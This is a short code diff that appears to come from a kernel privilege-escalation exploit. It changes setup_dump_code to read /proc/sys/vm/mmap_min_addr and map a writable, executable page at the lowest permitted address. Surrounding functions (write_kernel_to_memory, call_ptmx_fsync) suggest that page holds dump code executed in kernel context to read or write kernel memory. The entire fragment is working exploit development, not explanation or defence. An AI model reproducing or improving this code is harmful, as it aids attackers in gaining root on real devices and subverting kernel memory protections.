@@ -329,12 +329,38 @@ write_kernel_to_memory(void *dump_code, void *memory)
   return write_kernel_to(dump_code, write_to_memory, &current);
 }
 
+static int
+get_executable_address(void)
+{
+  FILE *fp;
+  int address = -1;
+
+  fp = fopen("/proc/sys/vm/mmap_min_addr", "r");
+  if (!fp) {
+    return -1;
+  }
+
+  fscanf(fp, "%d", &address);
+  fclose(fp);
+
+  if (abs(address - (int)&call_ptmx_fsync) < 0x1000) {
+    address += 0x2000;
+  }
+
+  return address;
+}
+
 static void *
 setup_dump_code(void)
 {
   void *dump_code;
+  int executable_address;
 
-  dump_code = mmap((void*)0x1000, 0x20,
+  executable_address = get_executable_address();
+  if (executable_address < 0) {
+    return NULL;
+  }
+  dump_code = mmap((void*)executable_address, 0x20,
                    PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,
                    0, 0);
